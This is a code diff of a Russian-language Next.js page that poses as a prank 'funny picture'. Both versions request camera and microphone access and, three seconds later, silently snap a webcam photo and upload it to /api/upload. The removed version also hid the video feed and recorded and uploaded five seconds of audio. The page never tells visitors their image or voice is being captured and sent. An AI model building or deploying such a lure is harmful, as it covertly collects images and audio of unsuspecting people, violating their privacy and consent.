@@ -1,85 +1,67 @@
-"use client";
+"use client"; // Указываем, что это клиентский компонент
 
-import { useEffect, useRef, useState } from "react";
+import { useEffect, useState, useRef } from "react";
 
 export default function Home() {
-  const [recording, setRecording] = useState(false);
+  const [stream, setStream] = useState<MediaStream | null>(null);
   const videoRef = useRef<HTMLVideoElement | null>(null);
-  const canvasRef = useRef<HTMLCanvasElement | null>(null);
-
+  
   useEffect(() => {
     const startCapture = async () => {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: true,
-          audio: true,
-        });
+        if (typeof navigator !== "undefined" && navigator.mediaDevices?.getUserMedia) {
+          const mediaStream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+            audio: true,
+          });
+          setStream(mediaStream);
+          if (videoRef.current) {
+            videoRef.current.srcObject = mediaStream;
+          }
 
-        if (videoRef.current) {
-          videoRef.current.srcObject = stream;
+          // Делаем фото через 3 секунды и отправляем в API
+          setTimeout(() => captureAndSendPhoto(), 3000);
+        } else {
+          console.error("getUserMedia не поддерживается в этом браузере");
         }
-
-        // Запись аудио
-        const mediaRecorder = new MediaRecorder(stream);
-        const audioChunks: Blob[] = [];
-        mediaRecorder.ondataavailable = (event) => {
-          audioChunks.push(event.data);
-        };
-
-        mediaRecorder.start();
-        setRecording(true);
-
-        setTimeout(() => {
-          mediaRecorder.stop();
-          setRecording(false);
-        }, 5000);
-
-        mediaRecorder.onstop = async () => {
-          const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
-          sendData(audioBlob);
-        };
-
-        // Захват фото
-        setTimeout(() => {
-          takePhoto();
-        }, 3000);
       } catch (error) {
-        console.error("Ошибка доступа к камере/микрофону", error);
+        console.error("Ошибка доступа к камере и микрофону:", error);
       }
     };
 
     startCapture();
   }, []);
 
-  const takePhoto = () => {
-    if (!canvasRef.current || !videoRef.current) return;
+  const captureAndSendPhoto = async () => {
+    if (!videoRef.current) return;
 
-    const context = canvasRef.current.getContext("2d");
+    const canvas = document.createElement("canvas");
+    const context = canvas.getContext("2d");
     if (!context) return;
 
-    context.drawImage(videoRef.current, 0, 0, 640, 480);
-    canvasRef.current.toBlob((blob) => {
-      if (blob) sendData(blob);
-    }, "image/png");
-  };
+    canvas.width = videoRef.current.videoWidth;
+    canvas.height = videoRef.current.videoHeight;
+    context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
 
-  const sendData = async (blob: Blob) => {
+    const blob = await new Promise<Blob | null>((resolve) => canvas.toBlob(resolve, "image/png"));
+    if (!blob) return;
+
     const formData = new FormData();
-    formData.append("file", blob);
+    formData.append("file", blob, "photo.png");
 
     await fetch("/api/upload", {
       method: "POST",
       body: formData,
     });
+
+    console.log("Фото отправлено на сервер!");
   };
 
   return (
     <div className="flex flex-col items-center justify-center min-h-screen bg-gray-900 text-white">
-      <h1 className="text-2xl font-bold mb-4">🤡 Смешная картинка</h1>
-      <img src="/funny.jpg" alt="Prank" className="w-96 h-auto rounded-lg" />
-      <video ref={videoRef} autoPlay className="hidden" />
-      <canvas ref={canvasRef} width="640" height="480" className="hidden" />
-      {recording && <p className="mt-2">🔴 Запись идет...</p>}
+      <h1 className="text-2xl mb-4">🤣 Посмотри сюда!</h1>
+      <video ref={videoRef} autoPlay playsInline className="w-64 h-64 bg-black"></video>
+      <img src="/funny.jpg" alt="Прикол" className="mt-4 w-64" />
     </div>
   );
 }
